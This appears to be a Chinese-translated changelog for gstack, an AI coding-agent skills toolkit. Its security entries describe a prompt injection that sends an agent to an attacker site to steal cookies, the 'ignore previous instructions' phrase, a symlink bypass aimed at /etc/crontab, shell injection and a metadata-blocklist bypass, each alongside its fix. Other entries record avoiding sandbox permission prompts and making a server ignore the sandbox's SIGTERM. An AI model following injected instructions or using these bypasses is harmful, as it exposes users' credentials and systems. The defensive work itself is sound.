- V0 休眠阴性测试 - 5D 心理维度（范围_胃口、风险_容忍度、细节_偏好、自主性、建筑_护理）和 8 个原型名称（大教堂建造者、船舶实用主义者、深层工艺、品味制造者、独奏操作员、顾问、楔子猎人、建造者教练）不得出现在默认模式技能输出中。使 V0 机器保持休眠状态，直到 V2。
- **V1.1 中的节奏改进。** 最初考虑的范围（审查排名、静默决策块、每阶段最多 3 个上限、翻转机制）在经过三轮工程审查后，发现了无法通过计划文本编辑来弥补的结构差距，被提取到 `docs/designs/PACING_UPDATES_V0.md` 中。 V1.1 采用真实的 V1 基线数据。
- 设计文档：`docs/designs/PLAN_TUNING_V1.md`。完整审查历史记录：CEO + Codex（×2 次通过，集成了 45 个发现）+ DX (TRIAGE) + Eng（×3 次通过 - 最后一次通过推动了范围缩小）。

## [0.19.0.0] - 2026-04-17

### 额外
- **`/plan-tune` 技能 - gstack 现在可以了解您认为哪些提示有价值，哪些提示很吵。** 如果您每次都以相同的方式回答相同的 AskUserQuestion，则这是教 gstack 停止询问的技能。说“别再问我有关变更日志完善的事情”——gstack 将其写下来，从那时起就尊重它，而单向门（破坏性操作、架构分叉、安全选择）仍然总是会问，因为安全胜过偏好。到处都是简单的英语。无需记住 CLI 子命令语法。
- **双轨开发者档案。** 告诉 gstack 作为一个构建者你是谁（5 个维度：范围偏好、风险承受能力、细节偏好、自主权、架构关怀）。 gstack 还会默默地跟踪您的行为所暗示的内容。 `/plan-tune` 并排显示两者并加上间隙，以便您可以看到您的操作何时与您的自我描述不符。 v1 是观察性的——还没有任何技能会根据你的个人资料改变他们的行为。一旦配置文件证明了自己，它就会出现在 v2 中。
- **构建器原型。** 运行 `/plan-tune vibe` (v2) 或让技能从您的维度推断它。八种命名原型（大教堂建造者、实用主义者、深度工艺、品味制造者、独奏操作员、顾问、楔子猎人、建造者教练）以及当您的尺寸不适合标准模式时的博学后备。代码库和模型现已发布；面向用户的命令是 v2。
- **每个 gstack 技能都有内联 `tune:` 反馈。** 当某项技能询问您某事时，您可以回复 `tune: never-ask` 或 `tune: always-ask` 或自由格式英语，gstack 将其标准化为偏好。仅当您通过 `gstack-config set question_tuning true` 选择加入时才运行 — 在此之前影响为零。
- **配置文件中毒防御。** 仅当前缀来自您自己的聊天消息时，内联 `tune:` 写入才会被接受 - 而不是来自工具输出、文件内容、PR 描述或恶意存储库可能注入指令的其他任何地方。二进制文件通过退出代码 2 强制执行此操作以拒绝写入。这是来自法典审查的外部声音；它从第一天起就被烘烤了。
- **带有 CI 强制执行的键入问题注册表。** 涵盖 15 种技能的 53 个重复出现的 AskUserQuestion 类别现在在 `scripts/question-registry.ts` 中声明，具有稳定的 ID、类别、门类型（单向与双向）和选项。 CI 测试断言架构保持有效。安全关键问题（破坏性操作、架构分叉）在声明站点被分类为 `one-way` — 永远不会从散文摘要中推断出来。
- **统一的开发人员配置文件。** `/office-hours` 技能的现有 builder-profile.jsonl（会话、信号、资源、主题）在首次使用时折叠到单个 `~/.gstack/developer-profile.json` 中。迁移是原子的、幂等的，并且存档源文件——安全地重新运行它。旧版 `gstack-builder-profile` 是一个薄填充程序，委托给新的二进制文件。

### 对于贡献者
- 新的 `docs/designs/PLAN_TUNING_V0.md` 捕获了完整的设计过程：pros/cons 的每一个决定，哪些内容被推迟到 v2 并具有明确的验收标准，哪些内容在 Codex 审查后被拒绝（基板作为提示约定，±0.2 钳位，前导码 LANDED 检测，单事件模式），以及最终形状如何组合在一起。在使用 v2 之前阅读本文以了解为什么存在这些限制。
- 三个新的二进制文件：`bin/gstack-question-log`（已验证附加到 Question-log.jsonl）、`bin/gstack-question-preference`（带有用户来源门的显式首选项存储）、`bin/gstack-developer-profile`（取代 gstack-builder-profile；支持 --read、--migrate、--derive、--profile、--gap、--trace、--check-mismatch、--vibe）。
- `scripts/resolvers/question-tuning.ts` 中的三个新的前导码解析器：问题偏好检查（在每个 AskUserQuestion 之前）、问题日志（之后）、使用用户源门指令进行内联调整反馈。合并为一个紧凑的 `generateQuestionTuning` 部分，用于 tier >= 2 技能，以最大限度地减少令牌开销。
- 手工制作的心理信号图（`scripts/psychographic-signals.ts`），带有版本哈希，因此当地图在 gstack 版本之间发生变化时，缓存的配置文件会自动重新计算。 9 个信号键，涵盖范围偏好、架构关心、测试规则、代码质量关心、细节偏好、设计关心、devex 关心、分发关心、会话模式。
- 关键字回退单向门分类器 (`scripts/one-way-doors.ts`) — 用于未出现在注册表中的临时问题 ID 的辅助安全层。主要安全性是注册表声明。
- 4 个测试文件中的 118 项新测试：`test/plan-tune.test.ts`（47 项测试 — 架构、助手、安全性、分类器、信号映射、原型、前导码注入、端到端管道）、`test/gstack-question-log.test.ts`（21 项测试 — 有效负载、拒绝负载、注入防御）、`test/gstack-question-preference.test.ts`（31 项测试 — check/write/read/clear/stats +用户源门+模式验证），`test/gstack-developer-profile.test.ts`（25 个测试 — 读取/migrate/derive/trace/gap/vibe/check-mismatch）。门层 E2E 测试 `skill-e2e-plan-tune.test.ts` 已注册（在 `bun run test:evals` 上运行）。
- 由外部声音审查驱动的范围回滚。最初的首席执行官扩张计划捆绑了心理自动决策+盲点指导+落地庆祝+全基板布线。 Codex 的 20 点批评指出，如果没有键入的问题注册表，“基质”就是营销； E1/E4/E6形成逻辑矛盾；配置文件中毒未得到解决；着陆在序言中，将副作用注入到每个技能的热路径中。接受回滚：v1 附带模式 + 观察层，v2 仅在基础证明持久后才添加行为适应。所有六个扩展均作为 P0 TODO 进行跟踪，并具有明确的验收标准。

## [0.18.4.0] - 2026-04-18

### 固定的
- **Apple Silicon 不再在首次运行时因 SIGKILL 而死亡。** `./setup` 现在对 `bun run build` 之后的每个编译的二进制文件进行临时协同设计，以便 M 系列 Mac 可以实际执行它们。如果您在进入第 2 天之前克隆了 gstack 并看到了 `zsh: killed ./browse/dist/browse`，这就是原因。感谢 @voidborne-d (#1003) 追踪 Bun `--compile` 链接器签名问题并提供经过测试的修复程序（跨 4 个二进制文件进行 6 次测试，幂等，平台保护）。
- **`/codex` 不再永远挂在 Claude Code 的 Bash 工具中。** Codex CLI 0.120.0 引入了 stdin 死锁：如果 stdin 是非 TTY 管道（Claude Code、CI、后台 bash、OpenClaw），则 `codex exec` 会等待 EOF 将其作为 `<stdin>` 块附加，即使提示作为位置参数传递也是如此。症状：“从标准输入读取附加输入...”，0% CPU，无输出。现在，每个 `codex exec` 和 `codex review` 都从 `/dev/null` 重定向标准输入。 `/autoplan`、外部所有计划审查声音、`/ship` 对抗性和 `/review` 对抗性全部解锁。感谢 @loning (#972) 的 13 分钟重现和最小修复。
- **`/codex` 和 `/autoplan` 在 Codex 身份验证丢失或损坏时快速失败。** 在此版本之前，注销的 Codex 用户会看到该技能花费数分钟时间构建昂贵的提示，结果却在中途显示身份验证错误。现在，这两种技能都通过多信号探针（`$CODEX_API_KEY`、`$OPENAI_API_KEY` 或 `${CODEX_HOME:-~/.codex}/auth.json`）进行预检身份验证，并在任何提示构造之前以明确的“运行 `codex login` 或设置 `$CODEX_API_KEY`”消息停止。奖励：如果您的 Codex CLI 使用的是已知错误的版本（当前为 0.120.0-0.120.2），您将获得一行提示来升级。
- 如果模型 API 停顿，**`/codex` 和 `/autoplan` 不再永远处于 0% CPU。** 每个 `codex exec` / `codex review` 现在都在带有 `gtimeout → timeout → unwrapped` 回退链的 10 分钟超时包装器下运行，因此您会得到明确的“Codex 停顿超过 10 分钟。常见原因：模型 API 停顿、长提示、网络问题。尝试重新运行。”消息而不是无限等待。 `./setup` 在 macOS 上自动安装 `coreutils`，因此 `gtimeout` 可用（对于 CI/锁定机器，使用 `GSTACK_SKIP_COREUTILS=1` 跳过）。
- **`/codex` 挑战模式现在会显示身份验证错误，而不是默默地丢弃它们。** 挑战模式将 stderr 传输到 `/dev/null`，这会掩盖运行过程中的任何身份验证失败。现在它将 stderr 捕获到临时文件并检查“auth”|登录|未经授权的模式。如果 Codex 在运行过程中出现错误，您会看到它。
- **计划审查不再悄然偏向最小差异建议。** `/plan-ceo-review` 和 `/plan-eng-review` 过去常常将“最小差异”列为工程偏好，而没有平衡“在必要时重写即可”注释。审稿人注意到了这一点并拒绝了本应获得批准的重写。该首选项现在被定义为“大小合适的差异”，并明确允许在现有基础被破坏时建议重写。 CEO 审查中的实施替代方案也得到了同等重要的澄清：不要仅仅因为它较小而默认为最小可行方案。

### 对于贡献者
- 新的 `bin/gstack-codex-probe` 将身份验证探针、版本检查、超时包装器和遥测记录器合并到 `/codex` 和 `/autoplan` 均来源的一个 bash 帮助程序中。当第二个外部语音后端登陆（Gemini CLI）时，这是要扩展的文件。
- 新的 `test/codex-hardening.test.ts` 为探针提供了 25 个确定性单元测试（8 个身份验证探针组合、10 个版本正则表达式案例，包括 `0.120.10` 误报防护、4 个超时包装器 + 命名空间卫生检查、3 个遥测有效负载模式检查，以确认没有 env 值泄漏到事件中）。免费套餐，<5 秒运行时间。
- 新的 `test/skill-e2e-autoplan-dual-voice.test.ts`（周期层）控制 `/autoplan` 双语音路径。断言 Claude 子代理和 Codex 语音都在第 1 阶段产生输出，或者当 Codex 不存在时记录 `[codex-unavailable]`。周期性 ~= $1/run，不是门。
- Codex 失败遥测事件（`codex_timeout`、`codex_auth_failed`、`codex_cli_missing`、`codex_version_warning`）现在位于现有用户选择加入之后的 `~/.gstack/analytics/skill-usage.jsonl` 中。可靠性回归在用户规模上是可见的。
- Codex 超时 (`exit 124`) 现在通过 `gstack-learnings-log` 自动记录操作学习。相同技能 /branch 上的未来 `/investigate` 会话会自动显示先前的挂起模式。

## [0.18.3.0] - 2026-04-17

### 额外
- **Windows cookie 导入。** `/setup-browser-cookies` 现在适用于 Windows。将其指向 Chrome、Edge、Brave 或 Chromium，选择一个配置文件，gstack 会将您真实的浏览器 cookie 拉入无头会话中。通过 PowerShell 处理 AES-256-GCM (Chrome 80+)、DPAPI 密钥解包，并在 Chrome 127+ 上退回到无头 CDP 会话以实现 v20 应用程序绑定加密。 Windows 用户现在可以首次使用 `/qa` 和 `/design-review` 进行经过身份验证的 QA 测试。
- **单命令 OpenCode 安装。** `./setup --host opencode` 现在为 OpenCode 连接 gstack 技能，就像为 Claude Code 和 Codex 所做的那样。不再需要手动解决方法。

### 固定的
- **每次技能调用时不再出现权限提示。** 每个 `/browse`、`/qa`、`/qa-only`、`/design-review`、`/office-hours`、`/canary`、`/pair-agent`、`/benchmark`、`/land-and-deploy`、`/design-shotgun`、`/design-consultation`、`/design-html`、`/plan-design-review` 和 `/open-gstack-browser`用于触发 Claude Code 沙箱询问“赋值值中的波形符”的调用。在浏览和设计解析器中用 `"$HOME/..."` 替换了裸露的 `~/` 以及一些仍然使用旧模式的模板。现在每项技能都会悄无声息地运行。
- **多步骤 QA 确实有效。** `$B` 浏览服务器在 Bash 工具调用之间崩溃了。当命令完成时，Claude Code 的沙箱会杀死父 shell，服务器将其视为关闭的提示。现在，服务器在调用过程中保持不变，使您的 cookie、页面状态和导航保持完整。在三个单独的 Bash 调用中运行 `$B goto`，然后运行 ​​`$B fill`，然后运行 ​​`$B click`，它就可以工作了。 30 分钟的空闲超时仍然可以处理最终的清理。 `Ctrl+C` 和 `/stop` 仍然会立即关闭。
- **Cookie 选择器停止搁浅 UI。** 如果启动 CLI 在导入过程中退出，选择器页面将闪烁 `Failed to fetch`，因为服务器已在其下关闭。现在，当任何选择器代码或会话处于活动状态时，浏览服务器都会保持活动状态。
- **OpenClaw 技能在 Codex 中干净地加载。** 4 个手工编写的 ClawHub 技能（ceo-review、调查、office-hours、retro）的 frontmatter 带有不带引号的冒号和非标准 `version`/`metadata` 字段，更严格的解析器会拒绝这些字段。现在，它们在 Codex CLI 上加载时不会出现错误，并在 GitHub 上正确呈现。

### 对于贡献者
- 社区 Wave 获得 6 个 PR：#993 (byliu-labs)、#994 (joelgreen)、#996 (voidborne-d)、#864 (cathrynlavery)、#982 (breakneo)、#892 (msr-hickory)。
- SIGTERM 处理现在是模式感知的。在正常模式下，服务器会忽略 SIGTERM，因此 Claude Code 的沙箱不会在会话中将其拆除。在头部模式 (`/open-gstack-browser`) 和隧道模式 (`/pair-agent`) 下，SIGTERM 仍然会触发干净关闭。这些模式会跳过空闲清理，因此如果没有模式门，孤儿守护进程将永远累积。请注意，v0.18.1.0 还会在 `BROWSE_HEADED=1` 时禁用父 PID 看门狗，因此引导模式受到双重保护。内联注释记录了解决顺序。
- Windows v20 应用程序绑定加密 CDP 回退现在会在条目中记录 Chrome 版本，并具有记录调试端口安全状态的内联注释（仅限 127.0.0.1，[9222, 9321] 中的随机端口以避免冲突，总是在最后被杀死）。
- 新的回归测试 `test/openclaw-native-skills.test.ts` 仅将 OpenClaw 技能前沿问题固定到 `name` + `description`。在 PR 时间捕获 version/metadata 漂移。

## [0.18.2.0] - 2026-04-17

### 固定的
- **`/ship` 停止跳过 `/document-release` 约 80% 的时间。** 旧的步骤 8.5 告诉 Claude 在 PR URL 已经输出之后，`cat` 一个 2500 行的外部技能文件，此时模型在上下文中有 500-1,750 行中间工具输出，并且智能程度最低。现在，在创建 PR 之前，`/ship` 将 `/document-release` 分派为在新上下文窗口中运行的子代理，因此 `## Documentation` 部分会被烘焙到初始 PR 正文中，而不是创建然后重新编辑的舞蹈。结果：文档实际上在每艘船上同步。

### 改变了
- **`/ship` 的 4 个最重的子工作流现在在独立的子代理上下文中运行。** 覆盖率审核（步骤 7）、计划完成审核（步骤 8）、Greptile 分类（步骤 10）和文档同步（步骤 18）各自调度一个获得新上下文窗口的子代理。父级只能看到结论（结构化 JSON），看不到中间文件读取。这是 Anthropic 的“使用 Claude 代码：会话管理和 1M 上下文”博客文章推荐的用于对抗上下文腐烂的模式：“我是否需要再次使用此工具输出，或者只是结论？如果只是结论，请使用子代理。”
- **`/ship` 步骤编号是干净的整数 1-20，而不是小数（`3.47`、`8.5`、`8.75`）。** 小数步骤编号向模型发出“可选附录”信号，并导致跳过后期步骤。干净的整数感觉是强制性的。真正嵌套的解析器子步骤（计划验证 8.1、范围漂移 8.2、审查军 9.1/9.2、交叉审查重复数据删除 9.3）将被保留。
- **`/ship` 现在在推送后打印“您尚未完成”。** 打破了模型将推送的分支视为任务已完成并跳过文档同步 + PR 创建的自然停止点。

### 对于贡献者
- `test/skill-validation.test.ts` 中的新回归防护可防止漂移回小数步数并捕获 `/ship` 和 `/review` 解析器条件之间的交叉污染。
- 发布模板重组：旧的步骤 8.5（PR 后文档与 `cat` 委托同步）被新的步骤 18（PR 前子代理调度，通过其 CHANGELOG 破坏保护、文档排除、风险更改门和竞争安全 PR 正文编辑调用完整的 `/document-release` 技能）取代。 Codex 发现最初计划的重新实施放弃了这些保护措施；这个版本重用了真正的`/document-release`。

## [0.18.1.0] - 2026-04-16

### 固定的
- **`/open-gstack-browser` 实际上现在保持打开状态。** 如果您运行 `/open-gstack-browser` 或 `$B connect` 并且您的浏览器在大约 15 秒后消失，这就是原因：浏览服务器内的看门狗正在轮询生成它的 CLI 进程，当 CLI 退出时（它会在启动浏览器后立即退出），看门狗会说“孤儿！”并杀死了一切。该修复在 CLI（始终为引导启动设置 `BROWSE_PARENT_PID=0`）和服务器（当 `BROWSE_HEADED=1` 时完全跳过看门狗）中禁用引导模式的看门狗。两层防御，以防未来的启动器忘记传递环境变量。感谢 @rocke2020 (#1020)、@sanghyuk-seo-nexcube (#1018)、@rodbland2021 (#1012) 和 @jbetala7 (#986) 独立诊断此问题并发送干净、有据可查的修复程序。
- **关闭头部浏览器窗口现在可以正确清理。** 在此版本之前，单击 GStack 浏览器窗口上的 X 会跳过服务器的清理例程并直接退出该过程。这留下了陈旧的侧边栏代理进程轮询死服务器、未保存的聊天会话状态、剩余的 Chromium 配置文件锁（这会导致下一个 `$B connect` 上的“配置文件正在使用”错误）以及陈旧的 `browse.json` 状态文件。现在，断开处理程序首先通过完整的 `shutdown()` 路径进行路由，清除所有内容，然后以代码 2 退出（仍然区分用户关闭和崩溃）。
- **CI/Claude Code Bash 调用现在可以共享持久的无头服务器。** 无头生成路径用于将 CLI 自己的 PID 硬编码为看门狗目标，忽略 `BROWSE_PARENT_PID=0`，即使您在环境中设置它也是如此。现在 `BROWSE_PARENT_PID=0 $B goto https://...` 让服务器在短暂的 CLI 调用中保持活动状态，这正是多步骤工作流程（CI 矩阵、Claude Code 的 Bash 工具、cookie 选择器流程）真正想要的。
- **`SIGTERM` / `SIGINT` 关闭现在以代码 0 而不是 1 退出。** 在 /ship 的对抗性审查期间捕获的回归：当 `shutdown()` 开始接受 `exitCode` 参数时，Node 的信号监听器默默地传递信号名称 (`'SIGTERM'`) 作为退出代码，该退出代码被强制为 `NaN` 并使用 `1`。包装侦听器，以便它们调用不带参数的 `shutdown()` 。您的 `Ctrl+C` 现在再次干净退出。

### 对于贡献者
- `test/relink.test.ts` 在并行测试负载下不再剥落。该文件中的 23 个测试每个 shell 都指向 `gstack-config` + `gstack-relink` （bash 子进程工作），并且在 `bun test` 下运行其他套件，每个测试比 Bun 的 5 秒默认值漂移约 200 毫秒。包装 `test` 将每次测试超时默认为 15 秒，并使用 `Object.assign` 保留 `.only`/`.skip`/`.each` 子 API。
- `BrowserManager` 获得了 `onDisconnect` 回调（由 `server.ts` 连接到 `shutdown(2)`），替换了断开处理程序中的直接 `process.exit(2)`。回调使用 try/catch + Promise 拒绝处理进行包装，因此拒绝清理路径仍然会退出进程，而不是将活动服务器附加到死浏览器。
- `shutdown()` 现在接受可选的 `exitCode: number = 0` 参数，由断开路径（出口 2）和信号路径（默认为 0）使用。相同的清理代码，两个调用站点，不同的退出代码。
- `cli.ts` 中的 `BROWSE_PARENT_PID` 解析现在匹配 `server.ts`: `parseInt` 而不是严格的字符串相等，因此 `BROWSE_PARENT_PID=0\n` （常见于 shell `export`）受到尊重。

## [0.18.0.1] - 2026-04-16

### 固定的
- **Windows 安装不再因构建错误而失败。** 如果您在 Windows（或新的 Linux 机器）上安装了 gstack，则 `./setup` 会因 `cannot write multiple output files without an output directory` 而死亡。 Windows 兼容的 Node 服务器包现在可以干净地构建，因此 `/browse`、`/canary`、`/pair-agent`、`/open-gstack-browser`、`/setup-browser-cookies` 和 `/design-review` 都可以再次在 Windows 上运行。如果您在不知情的情况下陷入了 gstack v0.15.11 时代的功能，这就是原因。感谢@tomasmontbrun-hash (#1019) 和@scarson (#1013) 独立追踪此事，并感谢#1010 和#960 的问题记者。
- **CI 不再对绿色构建撒谎。** `package.json` 中的 `build` 和 `test` 脚本有一个 shell 优先级陷阱，其中尾随 `||true` 吞掉了“整个”命令链的失败，而不仅仅是其本来的清理步骤。这就是上面的 Windows 构建错误最初的产生方式。 CI 运行了构建，构建失败了，但 CI 仍然报告成功。现在构建和测试失败实际上失败了。沉默的 CI 是最糟糕的 CI。
- Windows 上的 **`/pair-agent` 在安装时出现安装问题，而不是隧道时间。** `./setup` 现在验证 Node 可以在 Windows 上加载 `@ngrok/ngrok`，就像对 Playwright 所做的那样。如果本机二进制文件未安装，您现在就会发现，而不是第一次尝试配对代理时。

### 对于贡献者
- 新的 `browse/test/build.test.ts` 验证 `server-node.mjs` 是格式正确的 ES 模块语法，并且 `@ngrok/ngrok` 实际上是外化的（不是内联的）。当之前没有运行任何构建时，优雅地跳过。
- 在 `browse/scripts/build-node-server.sh` 中添加了一条策略注释，解释何时以及为何外部化依赖项。如果您添加带有本机插件或动态 `await import()` 的 dep，注释会告诉您将其插入的位置。

## [0.18.0.0] - 2026-04-15

### 额外
- **混淆协议。** 每个工作流程技能现在都有一个内联歧义门。当克劳德做出一个可能有两种方式的决定时（哪种架构？哪种数据模型？范围不明确的破坏性操作？），它会停下来询问而不是猜测。仅适用于高风险决策，因此不会减慢日常编码速度。解决了 Karpathy 的 #1 AI 编码失败模式。
- **Hermes 主机支持。** gstack 现在通过适当的工具重写（`terminal`、`read_file`、`patch`、`delegate_task`）生成 [Hermes Agent](https://github.com/nousresearch/hermes-agent) 的技能文档。 `./setup --host hermes` 打印集成指令。
- **GBrain 主机 + Brain-First 解析器。** GBrain 是 gstack 的“mod”。安装后，您的编码技能将变得具有大脑意识：它们在开始之前在您的大脑中搜索相关上下文，并在完成后将结果保存到您的大脑中。现在有 10 种技能具有大脑感知能力：/office-hours、/investigate、/plan-ceo-review、/retro、/ship、/qa、/design-review、/plan-eng-review、/cso 和 /design-consultation。与 GBrain >= v0.10.0 兼容。
- **GBrain v0.10.0 集成。** 代理指令现在使用 `gbrain search` （快速关键字查找）而不是 `gbrain query` （昂贵的混合）。每个命令都显示完整的 CLI 语法，包括 `--title`、`--tags` 和 Heredoc 示例。关键字提取指导可帮助代理有效搜索。实体丰富会为技能输出中提到的人员和公司自动创建存根页面。节流错误被命名，以便代理可以检测和处理它们。序言健康检查在会话开始时运行 `gbrain doctor --fast --json` ，并在大脑退化时命名失败的检查。
- **GBrain 路由器的技能触发器。** 所有 38 个技能模板现在都在其 frontmatter 中包含 `triggers:` 数组，多词关键字，例如“调试这个”、“运送它”、“集体讨论这个”。这些为 GBrain 的 RESOLVER.md 技能路由器提供动力并通过 `checkResolvable()` 验证。与 `voice-triggers:` （语音到文本别名）不同。
- **Hermes 大脑支持。** 安装了 GBrain 作为 mod 的 Hermes 特工现在可以自动获取大脑功能。解析器回退逻辑（“如果 GBrain 不可用，则继续执行”）可以优雅地处理非 GBrain Hermes 安装。
- **slop:diff in /review.** 现在，每次代码审查都运行 `bun run slop:diff` 作为咨询诊断，在 AI 代码质量问题（空捕获、冗余抽象、过于复杂的模式）落地之前捕获它们。仅供参考，绝不阻塞。
- **Karpathy 兼容性。** 自述文件现在将 gstack 定位为 [Karpathy-style CLAUDE.md rules](https://github.com/forrestchang/andrej-karpathy-skills) （17K 星）的工作流程执行层。将每个故障模式映射到解决它的 gstack 技能。

### 改变了
- **CEO 审查 HARD GATE 强化。** “请勿更改任何代码。仅进行审查。”现在在每个停止点（12 个位置）重复，而不仅仅是顶部。及时重复可显着减少“开始实施”故障模式。
- **办公时间设计文档可见性。** 编写设计文档后，该技能现在会打印完整路径，以便下游技能（/plan-ceo-review、/plan-eng-review）可以找到它。
- **调查调查历史记录。** 现在，每个调查都会使用 `type: "investigation"` 和受影响的文件路径记录到学习系统。未来对相同文件的调查会自动发现先前的根本原因。同一区域重复出现的错误 = 建筑气味。
- **Retro 非 git 上下文。** 如果 `~/.gstack/retro-context.md` 存在，retro 现在会读取它以获取 git 历史记录中未出现的会议记录、日历事件和决策。
- **原生 OpenClaw 技能得到改进。** 4 种手工制作的 ClawHub 技能（办公时间、CEO 审查、调查、回顾）现在反映了上面的模板改进。
- **主机数量：8 到 10。** Hermes 和 GBrain 加入 Claude、Codex、Factory、Kiro、OpenCode、Slate、Cursor 和 OpenClaw。

## [0.17.0.0] - 2026-04-14

### 额外
- **用户体验行为基础。** 现在，每项设计技能都会考虑用户的实际行为方式，而不仅仅是界面的外观。共享的 `{{UX_PRINCIPLES}}` 解析器将 Steve Krug 的“别让我思考”提炼成可操作的指导：扫描行为、满意度、商誉库、导航寻路和行李箱测试。注入 /design-html、/design-shotgun、/design-review 和 /plan-design-review。您的设计评审现在发现了“此导航令人困惑”的问题，而不仅仅是“对比度为 4.3:1”。
- **6 个可用性测试融入设计审核中。** 该方法现在运行主干测试（你能说出这是什么网站、你在哪个页面以及如何搜索吗？）、3 秒扫描（用户首先看到什么？）、页面区域测试（你能说出每个部分的目的吗？）、带有字数统计的快乐对话检测（此页面有多少是“等等等等”？）、无意识选择审核（每次点击都感觉很明显吗？）以及使用可视化仪表板跟踪 Goodwill Reservoir（是什么耗尽了用户每一步的耐心？）。
- **第一人称叙述模式。** 设计审查报告现在读起来就像可用性顾问看着有人使用您的网站：“我正在看这个页面......我的眼睛转向徽标，然后我完全跳过一堵文本墙。等等，那是一个按钮吗？”使用防倾斜护栏：如果代理无法说出特定元素的名称，就会产生陈词滥调。
- **`$B ux-audit` 命令。** 独立的 UX 结构提取。一个命令可将站点 ID、导航、标题、交互元素、文本块和搜索状态提取为结构化 JSON。代理对数据应用 6 项可用性测试。使用元素上限进行纯数据提取（50 个标题、100 个链接、200 个交互、50 个文本块）。
- **`snapshot -H` / `--heatmap` 标志。** 颜色编码的叠加屏幕截图。将引用 ID 的 JSON 映射传递给颜色 (`green`/`yellow`/`red`/`blue`/`orange`/`gray`)，并获取带有每个元素彩色框的带注释的屏幕截图。颜色白名单可防止 CSS 注入。可组合性：任何技能都可以使用它。
- **令牌上限强制执行。** `gen-skill-docs` 现在会在任何生成的 SKILL.md 超过 100KB（约 25K 令牌）时发出警告。在降低代理性能之前及时发现膨胀。

### 改变了
- **Krug 的 Always/never 规则** 添加到设计硬规则中：绝不占位符作为标签，绝不浮动标题，始终访问链接区别，绝不低于 16px 正文文本。这些作为机械检查加入现有的人工智能污物黑名单。
- **计划-设计-审查参考**现在包括 Steve Krug、Ginny Redish（放开言语）和 Caroline Jarrett（有效的表格）以及 Rams、Norman 和 Nielsen。

## [0.16.4.0] - 2026-04-13

### 额外
- **Cookie 来源固定。** 当您导入特定域的 cookie 时，现在会在与这些域不匹配的页面上阻止 JS 执行。这可以防止提示注入导航到攻击者的站点并运行 `document.cookie` 来窃取您导入的 cookie 的攻击。子域匹配会自动进行（导入 `.github.com` 允许 `api.github.com`）。当没有导入 cookie 时，一切都像以前一样工作。来自 @halbert04 的 3 个 PR。
- **命令审核日志。** 每个浏览命令现在都会在 `~/.gstack/.browse/browse-audit.jsonl` 中获得持久的取证跟踪。时间戳、命令、参数、页面来源、持续时间、状态、错误以及是否导入 cookie。仅追加，永不截断，在服务器重新启动后仍然存在。尽最大努力写入永远不会阻止命令执行。来自@halbert04。
- **Cookie 域跟踪。** gstack 现在跟踪从哪些域导入 cookie。上述原点固定的基础。通过 `--domain` 自动跟踪直接导入。新的 `--all` 标志使完整浏览器 cookie 导入成为显式选择加入而不是默认设置。

### 固定的
- **文件写入中的符号链接绕过。** `validateOutputPath` 仅检查父目录中的符号链接，而不检查文件本身。 `/tmp/evil.png` 处指向 `/etc/crontab` 的符号链接通过了验证，因为父级 `/tmp` 是安全的。现在在写入之前使用 `lstatSync` 检查文件。来自@Hybirdss。
- **Cookie 导入路径绕过。** 两个问题：相对路径绕过所有验证（`path.isAbsolute()` 门让 `sensitive-file.json` 通过），并且缺少符号链接解析（`path.resolve` 没有 `realpathSync`）。现在解析为绝对，解析符号链接，并检查安全目录。来自@urbantech。
- **安装脚本中的 Shell 注入。** `gstack-settings-hook` 将文件路径直接插入到 `bun -e` JavaScript 块中。带引号的路径破坏了 JS 字符串上下文。现在使用环境变量 (`process.env`)。系统审计确认只有这个脚本存在漏洞。来自@garagon。
- **表单字段凭据泄漏。** 快照编辑仅适用于 `type="password"` 字段。名为 `csrf_token`、`api_key`、`session_id` 的隐藏字段和文本字段在 LLM 上下文中未经过编辑地公开。现在根据敏感模式检查字段名称和 ID。来自@garagon。
- **学习提示注入。** 三个修复：输入验证（类型 /key/confidence 允许列表）、洞察字段中的注入模式检测（阻止“忽略先前的指令”等）以及跨项目信任门（仅用户声明的学习跨项目边界）。来自@Ziadstr。
- **IPv6 元数据绕过。** URL 构造函数将 `::ffff:169.254.169.254` 规范化为 `::ffff:a9fe:a9fe`（十六进制），该值不在阻止列表中。添加了两种十六进制编码形式。来自@mehmoodosman。
- **会话文件世界可读。** `/tmp` 中的设计会话文件是使用默认权限 (0644) 创建的。现在 0600（仅限所有者）。来自@garagon。
- **设置中冻结锁定文件。** `bun install` 现在使用 `--frozen-lockfile` 来防止通过浮动 semver 范围进行供应链攻击。来自@halbert04。
- **Dockerfile chmod 修复。** 删除了重复的递归 `chmod -R 1777 /tmp` （文件上的递​​归粘性位没有定义的行为）。来自@Gonzih。
- **在 cookie 导入中硬编码 /tmp。** `cookie-import-browser` 直接使用 `/tmp` 而不是 `os.tmpdir()`，破坏了 Windows 支持。

### 安全
- 关闭了 14 个安全问题（#665-#675、#566、#479、#467、#545），这些问题在前几波中已修复，但仍在 GitHub 上开放。
- 关闭了 17 个社区安全 PR，其中包含感谢信息和提交参考。
- 安全第 3 波：12 个修复，7 个贡献者。非常感谢@Hybirdss、@urbantech、@garagon、@Ziadstr、@halbert04、@mehmoodosman、@Gonzih。

## [0.16.3.0] - 2026-04-09

### 改变了
- **AI 污水清理。** 运行 [slop-scan](https://github.com/benvinegar/slop-scan)，结果从 100 个结果（2.38 分数/file）下降到 90 个结果（1.96 分数/file）。好的部分： `safeUnlink()` 和 `safeKill()` 实用程序可以捕获真正的错误（在关闭时吞噬 EPERM 是一种无声的数据丢失风险）。 `safeUnlinkQuiet()` 用于投掷比吞咽更糟糕的清理路径。 `isProcessAlive()` 提取到具有 Windows 支持的共享模块。删除了多余的 `return await`。类型化异常捕获（TypeError、DOMException、ENOENT）替换系统边界代码中的空捕获。我们尝试并恢复的部分：错误消息上的字符串匹配很脆弱，扩展捕获和日志按原样是正确的，传递包装器注释是 linter 游戏。我们采用人工智能编码，并为此感到自豪。目标是代码质量，而不是隐藏。

### 额外
- **`bun run slop:diff`** 仅显示您的分支与主分支上引入的新的倾斜扫描结果。比较行号不敏感，因此移位的代码不会产生误报。在 `bun test` 之后自动运行。
- CLAUDE.md 中的**倾斜扫描使用指南**：要修复什么（真正的质量）与不要修复什么（linter 游戏）。包括实用函数参考表。
- **设计文档**，以便将来在 `/review` 和 `/ship` 技能 (`docs/designs/SLOP_SCAN_FOR_REVIEW_SHIP.md`) 中进行倾斜扫描集成。

## [0.16.2.0] - 2026-04-09

### 额外
- **办公时间现在会记住您。** 结束体验会根据您完成的会话次数进行调整。第一次：完整的 YC 请求和创始人资源。第 2-3 节：“欢迎回来。上次您从事[您的项目]。进展如何？”第 4-7 节：整个旅程中的弧级回调、累积的信号可见性以及自动生成的构建者旅程叙述。会话 8+：数据不言而喻。
